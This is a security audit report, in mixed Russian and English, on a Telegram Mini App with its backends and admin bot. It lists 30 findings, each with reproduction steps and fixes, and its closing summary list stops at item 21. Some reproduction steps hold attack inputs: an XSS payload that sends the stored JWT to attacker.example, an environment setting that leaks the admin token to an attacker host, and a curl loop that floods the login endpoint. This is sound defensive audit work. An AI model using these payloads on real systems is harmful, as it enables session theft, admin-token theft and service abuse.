# Security Audit — Bloom Club Telegram Mini App / Admin Bot

Дата аудита: 2026-06-25.

Scope: исключительно security audit репозитория. Код приложения не изменялся; добавлен только этот отчёт `security-audit.md`.

## Изученные материалы

Перед аудитом были изучены обязательные документы:

- `architecture.md`
- `backend.md`
- `frontend.md`
- `state-management.md`
- `request-flow.md`
- `data-flow.md`
- `infrastructure.md`

Также проведён статический обзор исходного кода Telegram Mini App frontend, Node production server, Python WSGI TG catalog backend, scripts, Admin Bot, Docker/deploy файлов и тестов.

## Методика

Проверялись: авторизация, JWT, Telegram initData, Telegram Login, хранение JWT, session/cookies/headers/CORS/CSRF, XSS/DOM/Stored/Reflected XSS, template injection, command injection, SQL injection, path traversal/directory traversal/LFI/RFI, open redirect, clickjacking, SSRF, IDOR, privilege escalation, broken access control, mass assignment, file upload/uploads/static files, proxy/reverse proxy, env/secrets/API keys/dotenv, production server, Python backend, Node backend, admin bot, Content/TG/WEB/Admin/Partner/Offer API, bootstrap, diagnostics/logging/error messages, information disclosure, rate limiting, replay attacks, Telegram replay/initData validation and authorization bypass.

Severity uses approximate CVSS v3.1 and assumes public production exposure unless otherwise noted.

---

# Findings

## 1. JWT/access token хранится в `localStorage`

**Описание.** Frontend сохраняет access token в `localStorage` под ключом `bloom_club_tma_auth` и добавляет его в `Authorization: Bearer` для API-запросов.

**Почему это проблема.** Любая XSS/DOM XSS/скомпрометированная зависимость/расширение WebView сможет прочитать token и использовать его вне Telegram WebView. В Telegram Mini App это особенно опасно, потому что один stored token переживает перезапуски приложения.

**Как воспроизвести.** В браузере/Telegram WebView после успешного логина выполнить в консоли `localStorage.getItem('bloom_club_tma_auth')` или внедрить XSS через CMS block/body и прочитать этот ключ.

**Вероятность.** Высокая, потому что stored token уже доступен frontend JS, а в проекте есть отдельный finding по `dangerouslySetInnerHTML`.

**Критичность.** High.

**CVSS приблизительно.** 8.1.

**Последствия.** Угон клиентской сессии, доступ к профилю, подписке, payment/linking endpoints, действия от имени пользователя.

**Что может сделать злоумышленник.** Украсть Bearer token, вызвать `/api/v1/clients/me/*`, инициировать действия от имени клиента до истечения JWT.

**Как исправить.** Перейти на короткоживущие access tokens + refresh/session в `HttpOnly; Secure; SameSite` cookie, привязать токен к Telegram user/session/device, очищать token при закрытии/истечении, ввести CSP и устранить XSS. Если cookie невозможны, хранить access token только in-memory и регулярно переаутентифицироваться через Telegram initData.

## 2. Stored XSS через CMS Home block `body`

**Описание.** `HomePage` рендерит `block.body` через `dangerouslySetInnerHTML` без локальной sanitization.

**Почему это проблема.** Любой HTML/JS, попавший в Content CMS или Content API response, выполняется в origin Mini App и получает доступ к localStorage token, DOM, user context и same-origin endpoints.

**Как воспроизвести.** Создать/изменить CMS block с body вроде `<img src=x onerror="fetch('https://attacker.example/?t='+localStorage.getItem('bloom_club_tma_auth'))">`, открыть Home page.

**Вероятность.** Средняя/высокая: требуется доступ к CMS/admin или компрометация Content API/sync, но admin bot как раз управляет CMS-контентом.

**Критичность.** Critical.

**CVSS приблизительно.** 9.1.

**Последствия.** Угон JWT, выполнение действий от имени пользователя, фишинг внутри Mini App, чтение профиля и подписки.

**Что может сделать злоумышленник.** Выполнить JavaScript в WebView пользователя, украсть токены, подменить UI, отправлять authenticated requests.

**Как исправить.** Запретить произвольный HTML в CMS либо санитизировать через строгий allowlist на backend и frontend (DOMPurify с профилем без event handlers/javascript URLs), заменить `dangerouslySetInnerHTML` на безопасный markdown/plain text renderer, добавить CSP.

## 3. Отсутствует Content Security Policy

**Описание.** Node server и Python wrapper отдают HTML/assets без `Content-Security-Policy`; static responses также без защитных security headers.

**Почему это проблема.** При любой HTML injection XSS не ограничена политикой: можно выполнить inline handlers/scripts, читать localStorage, делать network exfiltration. Также нет базовой защиты от подключений к произвольным источникам.

**Как воспроизвести.** `curl -I /` и убедиться, что CSP отсутствует. Затем использовать finding #2 и выполнить inline handler.

**Вероятность.** Высокая.

**Критичность.** High.

**CVSS приблизительно.** 8.0.

**Последствия.** Усиление XSS, exfiltration токенов, загрузка вредоносных ресурсов.

**Что может сделать злоумышленник.** Использовать любую HTML injection без дополнительных барьеров.

**Как исправить.** Добавить CSP минимум: `default-src 'self'; script-src 'self' https://telegram.org ...; connect-src 'self' https://bloomclub.ru; img-src 'self' https: data:; style-src 'self' 'unsafe-inline'` с постепенным ужесточением/nonces. Параллельно добавить `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`.

## 4. Отсутствует защита от clickjacking / frame embedding policy

**Описание.** Ответы HTML не содержат `frame-ancestors` в CSP и `X-Frame-Options`.

**Почему это проблема.** Mini App обязан открываться в Telegram WebView, но без ограничений его можно встроить в сторонние страницы/оверлеи, что облегчает UI redressing, clickjacking и фишинг.

**Как воспроизвести.** Создать стороннюю HTML-страницу с `<iframe src="https://miniapp-domain/">`; если proxy не добавляет заголовки, embedding будет разрешён браузером.

**Вероятность.** Средняя.

**Критичность.** Medium.

**CVSS приблизительно.** 6.1.

**Последствия.** Пользовательские действия через подставной UI, credential/token phishing, снижение доверия.

**Что может сделать злоумышленник.** Встроить Mini App в фишинговую страницу и заставить пользователя нажать UI-элементы.

**Как исправить.** Добавить `Content-Security-Policy: frame-ancestors https://web.telegram.org https://*.telegram.org` с проверкой совместимости Telegram clients или `X-Frame-Options` там, где применимо. Не использовать `DENY`, если Telegram WebView требует embedding.

## 5. Node production server не задаёт HSTS и другие transport/security headers

**Описание.** Server не выставляет `Strict-Transport-Security`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy` и другие baseline headers.

**Почему это проблема.** Если reverse proxy не добавляет их сам, пользователи подвержены downgrade/mixed-content рискам, MIME sniffing и лишней утечке referrer.

**Как воспроизвести.** `curl -I https://domain/` и проверить отсутствие перечисленных headers.

**Вероятность.** Средняя: часть может добавляться внешним ingress, но в репозитории этого нет.

**Критичность.** Medium.

**CVSS приблизительно.** 5.3.

**Последствия.** Повышенный риск MITM/downgrade, MIME confusion, information leakage.

**Что может сделать злоумышленник.** Использовать слабые transport/browser defaults при ошибочной proxy настройке.

**Как исправить.** Настроить security headers в Node и/или reverse proxy; включить HSTS только после подтверждения HTTPS на всех subdomains.

## 6. Telegram initData validation не выполняется в этом репозитории

**Описание.** Node endpoint `/api/v1/auth/telegram-miniapp-login` только проксирует initData в WEB API; локальной проверки hash/auth_date/signature нет.

**Почему это проблема.** Без проверки на ближайшем auth boundary безопасность полностью зависит от внешнего WEB backend. Если WEB backend ошибётся или route будет переключён на локальный backend, поддельный initData может привести к login bypass.

**Как воспроизвести.** Отправить `POST /api/v1/auth/telegram-miniapp-login` с произвольным `init_data`; Node примет и проксирует. Итог зависит от внешнего WEB API, который вне репозитория.

**Вероятность.** Средняя.

**Критичность.** High.

**CVSS приблизительно.** 8.1, если WEB backend не валидирует строго; иначе informational/defense-in-depth.

**Последствия.** Потенциальная авторизация под чужим Telegram user.

**Что может сделать злоумышленник.** Подобрать/подделать login payload и получить JWT, если внешний backend некорректен.

**Как исправить.** Гарантировать server-side validation initData на WEB backend: HMAC/hash по Bot Token, проверка `auth_date` freshness, replay cache, binding user id. В Node можно добавить defense-in-depth validation перед proxy или хотя бы negative tests against WEB backend.

## 7. Нет явной защиты от replay Telegram initData на уровне Node

**Описание.** Node принимает один и тот же `init_data` неограниченное число раз; rate/replay decision делегирован внешнему WEB API.

**Почему это проблема.** Утёкший initData может повторно использоваться для получения новых JWT, если WEB backend допускает широкий auth_date window или не ведёт replay cache.

**Как воспроизвести.** Перехватить собственный valid `init_data`, несколько раз отправить тот же body на `/api/v1/auth/telegram-miniapp-login` и сравнить, выдаются ли новые tokens.

**Вероятность.** Средняя.

**Критичность.** High при слабом WEB backend; Medium при строгом backend.

**CVSS приблизительно.** 7.5.

**Последствия.** Продление сессий и повторный login по старому Telegram payload.

**Что может сделать злоумышленник.** Использовать старый initData для получения действующего access token.

**Как исправить.** На backend проверять `auth_date` с коротким TTL, хранить nonce/hash использованных initData на время TTL, лимитировать login attempts per IP/user/hash.

## 8. Login endpoint не имеет rate limiting и abuse throttling

**Описание.** Node login proxy принимает до 1 MiB body и проксирует запросы на внешнее WEB API без локального rate limit.

**Почему это проблема.** Endpoint можно использовать для brute force/credential stuffing initData, нагрузки на WEB API и расходования upstream resources.

**Как воспроизвести.** Запустить `for i in {1..1000}; do curl -s -X POST /api/v1/auth/telegram-miniapp-login -d '{"init_data":"x"}' -H 'content-type: application/json' & done` и увидеть, что Node будет проксировать без локального throttling.

**Вероятность.** Высокая.

**Критичность.** Medium/High.

**CVSS приблизительно.** 7.1.

**Последствия.** DoS внешнего WEB auth, лог-спам, рост latency, блокировки upstream.

**Что может сделать злоумышленник.** Массово нагружать login и WEB backend.

**Как исправить.** Добавить rate limit по IP, user-agent, initData hash; body limit уменьшить до реалистичного размера; добавить circuit breaker и WAF/ingress throttling.

## 9. Нет глобального rate limiting на API, static и diagnostics endpoints

**Описание.** `/api/tg/*`, `/api/content/blocks`, `/api/v1/clients/*`, `/debug/runtime-port`, uploads/static endpoints не имеют локального rate limit.

**Почему это проблема.** Public endpoints можно использовать для DB scraping, proxy amplification, health/debug enumeration и DoS.

**Как воспроизвести.** Массово вызывать `/api/tg/partners`, `/api/tg/status`, `/api/content/blocks?placement=...`; Node будет выполнять DB/proxy работу без throttling.

**Вероятность.** Высокая.

**Критичность.** Medium.

**CVSS приблизительно.** 6.8.

**Последствия.** Перегрузка Node, Postgres, внешнего Content API, деградация Mini App.

**Что может сделать злоумышленник.** Скрапить каталог, вызвать много upstream requests, ухудшить доступность.

**Как исправить.** Rate limit на ingress/Node, request coalescing/caching для public catalog/content, quotas для diagnostics, CDN cache для assets/catalog where safe.

## 10. Public diagnostics endpoint `/debug/runtime-port` без авторизации

**Описание.** `/debug/runtime-port` публично возвращает actual port, host, uptime и часть runtime env candidates.

**Почему это проблема.** Даже если секреты не выводятся, endpoint раскрывает runtime topology, host/port settings, uptime и помогает fingerprinting/deployment reconnaissance.

**Как воспроизвести.** `curl https://domain/debug/runtime-port`.

**Вероятность.** Высокая, endpoint публичен.

**Критичность.** Low/Medium.

**CVSS приблизительно.** 4.3.

**Последствия.** Information disclosure, помощь атакующим при recon/DoS.

**Что может сделать злоумышленник.** Узнать фактический port/env кандидаты, uptime, подтвердить стек Node.

**Как исправить.** Закрыть endpoint auth/IP allowlist, отключить в production или возвращать минимум информации.

## 11. `/api/tg/status` раскрывает внутренние counts и DB availability

**Описание.** Public endpoint возвращает counts partners/offers и auto_init flag; DB errors различаются как `not_configured`/`unavailable`.

**Почему это проблема.** Атакующий получает сведения о размере базы, активности синка и состоянии БД.

**Как воспроизвести.** `curl https://domain/api/tg/status`.

**Вероятность.** Высокая.

**Критичность.** Low.

**CVSS приблизительно.** 3.7.

**Последствия.** Reconnaissance и мониторинг состояния production извне.

**Что может сделать злоумышленник.** Отслеживать обновления каталога, DB outages, моменты deploy/sync.

**Как исправить.** Ограничить status endpoint auth/IP allowlist или разделить public health и private status.

## 12. Client API proxy forwards arbitrary query strings to WEB API

**Описание.** Node разрешает `/api/v1/clients/me/*` и переносит исходный query string в target WEB API.

**Почему это проблема.** Если внешний WEB API имеет скрытые query-параметры (`include`, `fields`, `debug`, pagination override), Node не ограничивает их. Это может усиливать IDOR/mass data exposure на внешнем API.

**Как воспроизвести.** Отправить `/api/v1/clients/me?include=payments,debug&fields=*` или `/api/v1/clients/me/verifications?client_id=...`; Node проксирует query unchanged. Итог зависит от WEB API.

**Вероятность.** Средняя.

**Критичность.** Medium.

**CVSS приблизительно.** 5.9.

**Последствия.** Потенциальная утечка лишних fields, обход frontend constraints.

**Что может сделать злоумышленник.** Подбирать undocumented query params к WEB API через same-origin proxy.

**Как исправить.** Allowlist разрешённых query params per proxied path, отклонять лишние параметры, добавить tests against sensitive query injection.

## 13. Content blocks proxy forwards arbitrary query strings to Content API

**Описание.** `/api/content/blocks` строит target URL как fixed path + исходный `requestUrl.search`.

**Почему это проблема.** Public attacker может пробовать query manipulation к Content API через same-origin Node: `?placement=...&preview=true&debug=true&include_inactive=1`.

**Как воспроизвести.** `curl '/api/content/blocks?placement=telegram_home&include_inactive=1&debug=1'` и посмотреть response/upstream logs.

**Вероятность.** Средняя.

**Критичность.** Medium.

**CVSS приблизительно.** 5.4.

**Последствия.** Утечка draft/inactive/debug content, если внешний Content API доверяет параметрам.

**Что может сделать злоумышленник.** Запрашивать неподдержанные/скрытые режимы Content API.

**Как исправить.** Allowlist `placement` и других явно разрешённых params; валидировать значения; не проксировать arbitrary query.

## 14. Admin Bot принимает `WEB_CONTENT_API_BASE_URL` без allowlist/SSRF guard

**Описание.** Admin Bot строит URL как `${base_url}${path}` из env `WEB_CONTENT_API_BASE_URL`. При ошибочной/скомпрометированной env настройке bot будет отправлять admin token на произвольный host.

**Почему это проблема.** Секрет `TELEGRAM_ADMIN_API_TOKEN` отправляется в `Authorization` и `X-Telegram-Admin-Token` на любой base URL из env. Это превращает env misconfiguration в exfiltration admin token.

**Как воспроизвести.** Установить `WEB_CONTENT_API_BASE_URL=https://attacker.example/api/content`, запустить bot и выполнить любую admin-команду; attacker получит headers.

**Вероятность.** Низкая/средняя: нужен доступ к env/deploy, но последствия высокие.

**Критичность.** High.

**CVSS приблизительно.** 7.5.

**Последствия.** Компрометация admin token, полный доступ к Content Admin API.

**Что может сделать злоумышленник.** Украсть token и управлять партнёрами/офферами/контентом через WEB Content Admin API.

**Как исправить.** Validate base URL against allowlist domains, запретить private IP/link-local/file schemes, fail closed on non-HTTPS in production, separate tokens per environment/service.

## 15. Sync script/Admin API base URL может утекать admin token при SSRF/misconfig

**Описание.** Операционные scripts используют `WEB_CONTENT_API_BASE_URL` и `TELEGRAM_ADMIN_API_TOKEN` для синхронизации Content CMS в TG DB; строгая allowlist в репозитории не обнаружена.

**Почему это проблема.** Как и Admin Bot, sync job может отправить privileged token на неверный или атакующий host.

**Как воспроизвести.** Запустить sync с `WEB_CONTENT_API_BASE_URL=https://attacker.example/api/content`; requests будут уходить на attacker с admin auth headers.

**Вероятность.** Низкая/средняя.

**Критичность.** High.

**CVSS приблизительно.** 7.5.

**Последствия.** Утечка Content Admin token, подмена синхронизируемого каталога, stored XSS через malicious content.

**Что может сделать злоумышленник.** Захватить token или отдать вредоносный catalog/content для записи в локальную БД.

**Как исправить.** Allowlist доменов, HTTPS-only, certificate pinning/strict TLS where feasible, scoped read-only token для sync, validation/sanitization content before upsert.

## 16. Python upload endpoint проверяет extension/content-type, но не проверяет magic bytes

**Описание.** `/api/content/uploads` разрешает jpg/jpeg/png/webp по extension и multipart content type, но не проверяет реальный формат файла.

**Почему это проблема.** Можно загрузить polyglot/HTML/SVG-like payload с image content type/extension. При неправильном downstream serving/content sniffing это может привести к stored XSS или malware hosting.

**Как воспроизвести.** Отправить multipart `file=@payload.jpg;type=image/jpeg`, где содержимое начинается с HTML/JS или polyglot, endpoint сохранит файл, если extension/content-type подходят.

**Вероятность.** Средняя.

**Критичность.** Medium.

**CVSS приблизительно.** 6.4.

**Последствия.** Хранение вредоносных файлов, XSS при MIME sniffing, abuse hosting.

**Что может сделать злоумышленник.** Загрузить payload под видом изображения и распространять public URL.

**Как исправить.** Проверять magic bytes и декодировать изображение библиотекой, пересохранять/транскодировать image, strip metadata, отдавать uploads с `X-Content-Type-Options: nosniff` и безопасным content-disposition.

## 17. Static uploads public без auth и без malware/abuse controls

**Описание.** Node отдаёт `/uploads/*` публично без auth, без cache/security headers и без content-disposition restrictions.

**Почему это проблема.** Любой загруженный файл становится публичным. Если upload endpoint доступен в Python deployment или через Content API, сервис может использоваться для хранения и распространения нежелательного контента.

**Как воспроизвести.** После upload открыть `/uploads/content/<uuid>.jpg` без auth.

**Вероятность.** Средняя.

**Критичность.** Medium.

**CVSS приблизительно.** 5.8.

**Последствия.** Public data leakage, abuse hosting, compliance риски.

**Что может сделать злоумышленник.** Распространять вредоносные/незаконные файлы с домена Bloom Club при наличии admin token или компрометации upload path.

**Как исправить.** Разнести uploads на object storage/CDN с scanning, private buckets + signed URLs where needed, malware scan, content moderation, strict MIME/nosniff, rate limit upload/download.

## 18. Upload endpoint использует один shared static admin token без granular permissions

**Описание.** Python admin endpoints и upload принимают либо `X-Telegram-Admin-Token`, либо `Authorization: Bearer` равный `TELEGRAM_ADMIN_API_TOKEN`.

**Почему это проблема.** Один общий bearer token даёт полный admin CRUD/upload доступ. Утечка из bot, logs, env или misdirected request компрометирует весь admin API.

**Как воспроизвести.** С любым valid token вызвать `PATCH /api/tg/admin/partners/{id}` или `POST /api/content/uploads`; нет per-user/per-action scope.

**Вероятность.** Средняя.

**Критичность.** High.

**CVSS приблизительно.** 8.2.

**Последствия.** Полный захват каталога/контента/upload.

**Что может сделать злоумышленник.** Создавать/изменять партнёров, офферы, фото; внедрять malicious content.

**Как исправить.** Перейти на scoped service tokens, rotation, short-lived credentials, audit logging, per-route permissions, separate upload/admin/sync tokens, mTLS or IP allowlist for admin API.

## 19. Admin API не имеет CSRF защиты при использовании Authorization header всё ещё есть browser exposure risk

**Описание.** Admin endpoints принимают Bearer/header token; cookies не используются. Классическая CSRF ниже, но если token попадёт в браузер/admin panel, нет CSRF/origin checks.

**Почему это проблема.** При будущем использовании из browser admin UI или сохранении token в web storage XSS/CSRF-like attacks станут критичными. Сейчас это design risk.

**Как воспроизвести.** Невозможно как classical CSRF без token; design issue проявится при переносе токена в browser context.

**Вероятность.** Низкая сейчас, средняя при развитии admin UI.

**Критичность.** Medium.

**CVSS приблизительно.** 5.0.

**Последствия.** Непреднамеренные admin mutations.

**Что может сделать злоумышленник.** При наличии browser token — выполнить admin write requests с вредоносной страницы/XSS.

**Как исправить.** Оставить admin API server-to-server, добавить Origin/Referer checks для browser clients, CSRF tokens if cookies, never expose admin token to frontend.

## 20. Отсутствует audit logging для admin mutations

**Описание.** Python admin CRUD/upload выполняет изменения, но в коде нет явного audit log с admin identity/action/object before/after. Shared token также не несёт identity.

**Почему это проблема.** При компрометации или ошибке админа невозможно надёжно установить, кто и что изменил.

**Как воспроизвести.** Выполнить `PATCH /api/tg/admin/partners/{id}` с valid token; response есть, но audit trail в репозитории не реализован.

**Вероятность.** Средняя.

**Критичность.** Medium.

**CVSS приблизительно.** 5.5.

**Последствия.** Низкая расследуемость, невозможность обнаружить malicious changes, compliance risk.

**Что может сделать злоумышленник.** Незаметно менять каталог/офферы и удалять/подменять контент.

**Как исправить.** Ввести per-admin identity, audit table/log, immutable append-only logs, request id, source IP, before/after diff, alerting на sensitive changes.

## 21. Возможная stored content injection в bootstrap catalog JSON снижена escaping, но нет schema/content sanitization

**Описание.** Node безопасно escaping-ит `<`, `>`, `&`, U+2028/U+2029 при injection bootstrap JSON в HTML, что защищает от прямого `</script>` breakout. Но данные каталога из DB затем используются в UI и как image URLs без централизованной validation/sanitization.

**Почему это проблема.** Текущий bootstrap script injection сделан правильно, но вредоносные URLs/text из Content CMS/TG DB могут использоваться в дальнейшем UI и HTML attributes, а часть content уже рендерится через `dangerouslySetInnerHTML`.

**Как воспроизвести.** Записать в DB/catalog поле `cover` как unusual URL/data payload или HTML-like text; открыть frontend и проверить rendering. Прямой script breakout через bootstrap должен быть заблокирован, но schema validation отсутствует.

**Вероятность.** Средняя.

**Критичность.** Medium.

**CVSS приблизительно.** 5.6.

**Последствия.** UI injection, image-based tracking, future XSS при изменениях компонентов.

**Что может сделать злоумышленник.** Внедрить malicious URLs/content в каталог через compromised admin/sync.

**Как исправить.** Валидировать schema at ingestion: URL schemes only `https`/relative uploads, max lengths, no HTML where plain text, sanitize rich text before storage.

## 22. Изображения/медиа URL из Content API и catalog допускают внешние hosts

**Описание.** Frontend отображает `block.image_url`, partner/offer/gallery images и avatar URLs напрямую как `<img src=...>`.

**Почему это проблема.** Это позволяет внешним hosts отслеживать IP/user-agent пользователей, создавать pixel tracking и потенциально эксплуатировать image parser vulnerabilities. Не XSS само по себе, но privacy/security risk.

**Как воспроизвести.** Установить CMS/catalog image_url на `https://attacker.example/pixel?u=...`, открыть страницу; браузер отправит request на attacker.

**Вероятность.** Средняя.

**Критичность.** Low/Medium.

**CVSS приблизительно.** 4.6.

**Последствия.** Tracking пользователей, утечка referrer/UA/IP, mixed content if HTTP allowed in some paths.

**Что может сделать злоумышленник.** Отслеживать пользователей Mini App и correlate sessions.

**Как исправить.** Proxy/cache media through trusted CDN, allowlist media domains, reject `http:` in production, set `Referrer-Policy: no-referrer`/`strict-origin-when-cross-origin`.

## 23. Admin Bot авторизация только по Telegram user ID без дополнительного подтверждения/2FA

**Описание.** Bot допускает команды, если `message.from_user.id` входит в `TELEGRAM_ADMIN_IDS`.

**Почему это проблема.** Компрометация Telegram аккаунта администратора сразу даёт доступ к Content Admin API через bot. Нет step-up confirmation, role scopes, per-action approvals.

**Как воспроизвести.** Отправить команду bot с аккаунта ID, который есть в env; bot позволит admin flow.

**Вероятность.** Средняя.

**Критичность.** High.

**CVSS приблизительно.** 7.2.

**Последствия.** Полное изменение CMS контента и потенциальная stored XSS.

**Что может сделать злоумышленник.** Через украденный Telegram аккаунт создать malicious block/offer/photo, изменить каталог, загрузить файлы.

**Как исправить.** Добавить role-based permissions, подтверждение критичных операций, short approval windows, optional passphrase/WebAuthn outside Telegram, alerting на admin actions, ограничение bot access по chat/user and command scopes.

## 24. Admin Bot показывает raw WEB API error detail администраторам

**Описание.** `WebApiError` включает status и detail/error/message из WEB API до 300 символов; bot likely отправляет это в Telegram chat.

**Почему это проблема.** Внешний WEB API может вернуть stack trace, SQL error, internal paths или PII; bot пересылает это в Telegram, где сообщения хранятся у Telegram и на устройствах админов.

**Как воспроизвести.** Заставить WEB Content API вернуть ошибку с чувствительным detail; bot покажет `WEB API вернул ошибку ...: <detail>`.

**Вероятность.** Средняя.

**Критичность.** Medium.

**CVSS приблизительно.** 5.7.

**Последствия.** Information disclosure в Telegram chats/logs.

**Что может сделать злоумышленник.** Если контролирует error text upstream, заставить bot раскрыть/распространить sensitive diagnostics.

**Как исправить.** Показывать admin-friendly generic errors, сохранять full detail только в защищённых server logs с redaction, ограничить known safe error fields.

## 25. CORS политика не задаётся явно; OPTIONS отвечает без CORS headers

**Описание.** Node для некоторых proxy endpoints обрабатывает OPTIONS, но не выставляет `Access-Control-Allow-Origin`/headers. Остальные endpoints CORS headers не задают.

**Почему это проблема.** Это не даёт cross-origin read по умолчанию, что безопаснее, но поведение зависит от reverse proxy. Неправильная proxy CORS настройка может открыть Bearer-protected endpoints для сторонних origins.

**Как воспроизвести.** Проверить `curl -i -X OPTIONS /api/v1/clients/me -H 'Origin: https://evil.example' -H 'Access-Control-Request-Method: GET'`; Node вернёт allow без CORS allow-origin. Затем проверить production ingress.

**Вероятность.** Средняя как configuration risk.

**Критичность.** Medium.

**CVSS приблизительно.** 5.3.

**Последствия.** При ошибочном wildcard CORS на proxy возможна утечка API responses сторонним sites.

**Что может сделать злоумышленник.** Использовать victim browser с stored token/cookies, если CORS+credentials будут включены неправильно.

**Как исправить.** Явно задать строгий CORS allowlist или вообще не включать CORS для same-origin Mini App API; задокументировать запрет wildcard+credentials на ingress.

## 26. Direct WEB API calls from frontend зависят от внешнего CORS и обходят same-origin proxy controls

**Описание.** Часть write-запросов frontend идёт напрямую на `VITE_API_BASE_URL` (`https://bloomclub.ru/api/v1` по умолчанию), а не через Node same-origin proxy.

**Почему это проблема.** Security controls неоднородны: CSP/CORS/rate limit/logging/session handling должны быть корректны на внешнем WEB API. Node allowlist для client proxy не защищает direct writes.

**Как воспроизвести.** В frontend вызвать `PATCH /clients/me` или payment/linking functions; request идёт к absolute WEB API base.

**Вероятность.** Высокая.

**Критичность.** Medium.

**CVSS приблизительно.** 5.8.

**Последствия.** Разный CORS/security policy, сложнее аудит и мониторинг, возможные bypasses frontend assumptions.

**Что может сделать злоумышленник.** Напрямую атаковать WEB API endpoints, минуя Node constraints.

**Как исправить.** Привести все sensitive endpoints к единому BFF/same-origin proxy или документировать/тестировать WEB API controls: auth, CORS, rate limit, CSRF, replay, IDOR.

## 27. Local TG catalog public API не требует authorization

**Описание.** `/api/tg/partners`, `/api/tg/partners/{id}`, `/api/tg/partners/{id}/offers` публичны и игнорируют Bearer.

**Почему это проблема.** Если каталог/офферы содержат partner-only/member-only коммерческую информацию, она доступна всем без Telegram/JWT. Также это упрощает scraping.

**Как воспроизвести.** Открыть `/api/tg/partners` из обычного браузера/incognito без Telegram и token.

**Вероятность.** Высокая.

**Критичность.** Low/Medium, зависит от чувствительности каталога.

**CVSS приблизительно.** 4.8.

**Последствия.** Scraping каталога, раскрытие коммерческой информации.

**Что может сделать злоумышленник.** Скопировать партнёров/офферы, отслеживать изменения.

**Как исправить.** Если данные не полностью публичные — требовать Telegram login/JWT, cache with auth, отделить public teaser от member-only fields.

## 28. Python admin CRUD допускает изменение `is_active` и content полей единым token без workflow approval

**Описание.** Admin API позволяет создавать/патчить партнёров, фото и офферы, включая `is_active`, sort_order и rich text fields, по одному token.

**Почему это проблема.** Это privilege concentration и content supply chain risk: один token может сразу публиковать вредоносный/ошибочный контент.

**Как воспроизвести.** С valid token отправить `PATCH /api/tg/admin/offers/{id}` с `is_active:true` и malicious description.

**Вероятность.** Средняя.

**Критичность.** Medium/High.

**CVSS приблизительно.** 6.9.

**Последствия.** Незаметная публикация malicious/offensive content, stored XSS through frontend rendering paths.

**Что может сделать злоумышленник.** Активировать скрытые офферы, менять описания/условия/фото.

**Как исправить.** Разделить create/edit/publish permissions, добавить moderation workflow, audit logs, signed admin actions.

## 29. Error handling в Node catch скрывает детали клиенту, но logs могут содержать URL query values

**Описание.** Proxy logs включают sanitized query/targetUrl до 500 символов. Sanitizer redacts token/hash/signature, но business query params могут содержать PII и попадать в logs.

**Почему это проблема.** Logs могут стать хранилищем PII/search params/linking data, особенно если будущие endpoints добавят sensitive query.

**Как воспроизвести.** Запросить `/api/content/blocks?placement=x&email=test@example.com`; query попадёт в `content_blocks_proxy_start` logs.

**Вероятность.** Средняя.

**Критичность.** Low/Medium.

**CVSS приблизительно.** 4.2.

**Последствия.** Sensitive information leakage через logs.

**Что может сделать злоумышленник.** Внедрять PII/escape-like values в logs, загрязнять SIEM, искать утечки.

**Как исправить.** Логировать только allowlisted query keys или hash, redact PII patterns, limit logs in production.

## 30. Отсутствуют dependency vulnerability controls в репозитории

**Описание.** В репозитории есть `package-lock.json` и Python requirements, но нет явных CI checks (`npm audit`, `pip-audit`, Dependabot config) в обнаруженных файлах.

**Почему это проблема.** Уязвимости в React/Vite/aiogram/httpx/pg/psycopg2 и transitive dependencies могут привести к supply-chain компрометации.

**Как воспроизвести.** Запустить `npm audit` и `pip-audit` при доступной сети; в репозитории не найден обязательный gate.

**Вероятность.** Средняя.

**Критичность.** Medium.

**CVSS приблизительно.** 5.5.

**Последствия.** Использование known vulnerable packages в production.

**Что может сделать злоумышленник.** Эксплуатировать известную CVE в runtime/build dependencies.

**Как исправить.** Добавить Dependabot/Renovate, CI `npm audit --omit=dev` или SCA, `pip-audit`, lockfile review, SBOM.

---

# What appeared safe / positive findings

- SQL Injection: основные Node queries используют parameterized `$1`; Python repository/admin queries используют placeholders для user-controlled IDs/values. Dynamic assignment columns собираются из fixed validated field names, не из пользовательских keys.
- Path Traversal / Directory Traversal / LFI: Node `serveAsset` и `serveUpload` используют `path.resolve` и проверку, что путь остаётся внутри root directory. Python wrapper аналогично проверяет resolved path parents для assets/uploads.
- Bootstrap JSON script breakout: Node сериализует bootstrap payload через `JSON.stringify` и escaping `<`, `>`, `&`, U+2028/U+2029, что защищает от прямого `</script>` breakout.
- Command Injection: в runtime backend/admin bot не обнаружено выполнения shell commands с пользовательским вводом.
- Open Redirect: явных server-side redirect endpoints не обнаружено.
- RFI: динамического include/import по пользовательскому URL не обнаружено.
- Mass Assignment: Python admin payload validation allowlist-ит поля партнёров/фото/офферов, произвольные JSON keys игнорируются.
- Secrets in examples: `.env.example` файлы не содержат реальных секретов по статическому осмотру.
- Telegram initDataUnsafe: frontend читает unsafe user id только для diagnostics/UI logic; авторизация выполняется через initData login flow, не через unsafe user id напрямую.

# What cannot be fully verified without external backend / production environment

- Реальная server-side валидация Telegram initData на `https://bloomclub.ru/api/v1/auth/telegram-miniapp-login`.
- JWT claims, expiry, audience/issuer, algorithm restrictions, revocation and binding to Telegram user.
- Replay protection for Telegram initData/JWT refresh on WEB backend.
- WEB API IDOR/Broken Access Control for `/api/v1/clients/me/*`, payments, linking, verification.
- WEB Content Admin API authorization, role model, CSRF/CORS/rate limit.
- Actual production reverse proxy headers, TLS/HSTS, CORS, WAF, IP allowlists.
- Production secret storage, token rotation, logging redaction outside repo.
- Production DB permissions/network exposure/backups.
- Telegram BotFather URL/domain and whether only HTTPS trusted domain is used.
- Whether external Content API sanitizes rich HTML before returning blocks.

# List of all found issues

1. JWT/access token stored in `localStorage`.
2. Stored XSS through CMS Home block `body` via `dangerouslySetInnerHTML`.
3. Missing Content Security Policy.
4. Missing clickjacking/frame embedding policy.
5. Missing HSTS/baseline security headers in Node server.
6. Telegram initData validation not implemented in this repo.
7. No Node-level Telegram initData replay protection.
8. No rate limiting on login endpoint.
9. No global API/static/diagnostics rate limiting.
10. Public `/debug/runtime-port` information disclosure.
11. Public `/api/tg/status` internal counts/DB state disclosure.
12. Client API proxy forwards arbitrary query strings.
13. Content blocks proxy forwards arbitrary query strings.
14. Admin Bot base URL has no allowlist/SSRF guard for admin token.
15. Sync/Admin API base URL may leak admin token on misconfiguration.
16. Upload endpoint lacks magic-byte/image validation.
17. Public uploads without auth/abuse controls.
18. Shared static admin token without granular permissions.
19. Admin API design lacks CSRF/origin protections for any future browser use.
20. Missing audit logging for admin mutations.
21. Catalog bootstrap has safe escaping, but no centralized catalog schema/content sanitization.
